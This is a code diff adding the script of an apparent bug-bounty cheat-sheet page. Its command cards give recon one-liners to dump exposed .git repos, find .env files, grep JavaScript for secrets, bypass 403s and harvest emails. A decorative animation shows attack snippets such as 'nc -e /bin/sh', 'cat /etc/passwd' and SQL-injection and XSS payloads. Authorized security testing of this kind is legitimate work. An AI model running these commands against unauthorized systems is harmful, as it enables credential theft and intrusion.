+    buildCmdCard('httpx daily diff — catch new endpoints',`cat all_subs_${D}.txt | httpx -silent -json -o httpx_today_${D}.json && diff <(jq -r '.url+"|"+.title' httpx_yesterday_${D}.json | sort) <(jq -r '.url+"|"+.title' httpx_today_${D}.json | sort) | grep "^>" | notify`),
+  ],[
+    'anew is most underrated tool — processes ONLY new assets, zero duplicates.',
+    'Set up daily cron: subfinder → anew → httpx → nuclei → notify. Fire and forget.',
+    'New JS = run SecretFinder immediately — deploys often leak tokens.',
+    'nuclei -nt daily — new CVE templates ship within hours of public disclosure.',
+    'Monitor GitHub with trufflehog — leaked keys in commits = instant P1.',
+    'Continuous monitoring wins P1s others miss — timing beats skill.',
+  ]));
+
+  sections.push(buildSection(19,'💡','One-Liners, Quick Wins & Hidden Gems',['one-liner','git-exposed','favicon-hash','.env','403-bypass','secrets'],[
+    buildCmdCard('Find exposed .git repos across all subdomains',`cat all_subs_${D}.txt | httpx -silent -path "/.git/HEAD" -mc 200 -ms "ref:" | tee git_exposed_${D}.txt`),
+    buildCmdCard('Dump exposed .git repo completely',`git-dumper https://${D}/.git ./git_dump_${D}/`),
+    buildCmdCard('Find exposed .env files',`cat all_subs_${D}.txt | httpx -silent -path "/.env" -mc 200 -ms "APP_KEY" | tee env_exposed_${D}.txt`),
+    buildCmdCard('Favicon hash — find assets via Shodan',`python3 -c "import mmh3,requests,base64; r=requests.get('https://${D}/favicon.ico',verify=False); print('Hash:', mmh3.hash(base64.encodebytes(r.content)))"\n# Then: shodan search http.favicon.hash:HASH`),
+    buildCmdCard('JS secrets bulk scan across entire scope',`cat js_files_${D}.txt | xargs -P 10 -I{} bash -c 'curl -sk "{}" | grep -Eo "(api_key|apikey|secret|token|password)[\"\\x27 :=]+[a-zA-Z0-9_-]{16,}" 2>/dev/null' | sort -u | tee js_secrets_${D}.txt`),
+    buildCmdCard('403 bypass — path manipulation tricks',`curl -s https://${D}/admin/ -H "X-Original-URL: /admin"\ncurl -s "https://${D}/%2fadmin"\ncurl -s "https://${D}/admin/."\ncurl -s "https://${D}//admin//"\ncurl -s "https://${D}/./admin/./" `),
+    buildCmdCard('Find all emails from target website',`curl -s https://${D} | grep -Eo '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' | sort -u`),
+    buildCmdCard('Check missing security headers in bulk',`nuclei -l live200_${D}.txt -t nuclei-templates/misconfiguration/http-missing-security-headers.yaml -o missing_headers_${D}.txt`),
+  ],[
+    'Exposed .git = instant critical — git-dumper + grep for DB creds and API keys.',
+    'Favicon hash Shodan search finds shadow IT and staging servers missed by DNS.',
+    '.env exposure = instant critical — DB_PASSWORD, APP_KEY, cloud keys in one file.',
+    '403 bypass tricks still win bounties in 2025 — always try first.',
+    'JS secrets one-liner: run on every engagement, every time — high yield, low effort.',
+  ]));
+
+  document.getElementById('accordionList').innerHTML = sections.join('');
+}
+// ── CYBER HACKER BACKGROUND LOGIC ──
+  document.addEventListener('DOMContentLoaded', () => {
+    const bgCanvas = document.getElementById('mc');
+    if (!bgCanvas) return;
+    const bgCtx = bgCanvas.getContext('2d');
+    
+    function resizeCanvas() {
+      bgCanvas.width = window.innerWidth * devicePixelRatio;
+      bgCanvas.height = window.innerHeight * devicePixelRatio;
+      bgCtx.scale(devicePixelRatio, devicePixelRatio);
+    }
+    window.addEventListener('resize', resizeCanvas);
+    resizeCanvas();
+
+    let W = window.innerWidth;
+    let H = window.innerHeight;
+    let cols = Math.floor(W / 17);
+    let drops = Array.from({length: cols}, () => Math.random() * -60);
+    const CHARS = '01アイウエオカキスセソタナニヌ>{}</>#!/bin/bash|curl|nmap|sql|xss|lfi';
+
+    function drawMatrix() {
+      bgCtx.fillStyle = 'rgba(3,8,5,0.07)';
+      bgCtx.fillRect(0, 0, bgCanvas.width, bgCanvas.height);
+      bgCtx.font = '12px monospace';
+      
+      // Update dimensions if window resized
+      if (window.innerWidth !== W) {
+        W = window.innerWidth;
+        H = window.innerHeight;
+        cols = Math.floor(W / 17);
+        drops = Array.from({length: cols}, () => Math.random() * -60);
+      }
+
+      drops.forEach((y, i) => {
+        const c = CHARS[Math.floor(Math.random() * CHARS.length)];
+        const bright = Math.random() > 0.93;
+        bgCtx.fillStyle = bright ? '#ffffff' : (i % 3 === 0 ? `rgba(0,229,255,${.2 + Math.random() * .6})` : `rgba(0,255,65,${.15 + Math.random() * .5})`);
+        bgCtx.fillText(c, i * 17 + 1, y * 17);
+        if (y * 17 > H && Math.random() > 0.975) drops[i] = 0;
+        drops[i] += 0.35;
+      });
+    }
+    setInterval(drawMatrix, 42);
+
+    // Floating Code Logic
+    const snippets = [
+      'subfinder -d $T', "' OR 1=1--", 'nmap -sV -sC', 'ffuf -w list.txt',
+      'sqlmap --dbs', '<svg onload=…>', 'hashcat -m 16500', 'curl -sk -X PUT',
+      'nuclei -t …', '${7*7} = 49', 'nc -e /bin/sh', 'cat /etc/passwd',
+      'xss hunter >', 'BOLA/IDOR +1', 'jwt alg:none', 'anew | httpx',
+      '#!/usr/bin/env', 'chmod +x *.sh', 'grep -oP "…"', 'trufflehog git'
+    ];
+    
+    const layer = document.getElementById('codeLayer');
+    function spawnCode() {
+      if(document.body.classList.contains('light')) return; // Pause spawning in light mode
+      const d = document.createElement('div');
+      const isCyan = Math.random() > 0.5;
+      d.style.cssText = `position:absolute;font-family:monospace;font-size:11px;color:${isCyan ? '#00e5ff' : '#00ff41'};
+        opacity:0;left:${4 + Math.random() * 88}%;top:${5 + Math.random() * 78}%;
+        white-space:nowrap;transition:opacity .6s ease,transform 3s ease;`;
+      d.textContent = snippets[Math.floor(Math.random() * snippets.length)];
+      layer.appendChild(d);
+      
+      requestAnimationFrame(() => { requestAnimationFrame(() => {
+        d.style.opacity = '0.38';
+        d.style.transform = `translateY(-${20 + Math.random() * 30}px)`;
+      });});
+      
+      setTimeout(() => { d.style.opacity = '0'; }, 2600);
+      setTimeout(() => d.remove(), 3300);
+    }
+    setInterval(spawnCode, 480);
+  });
+</script>
+</body>
+</html>
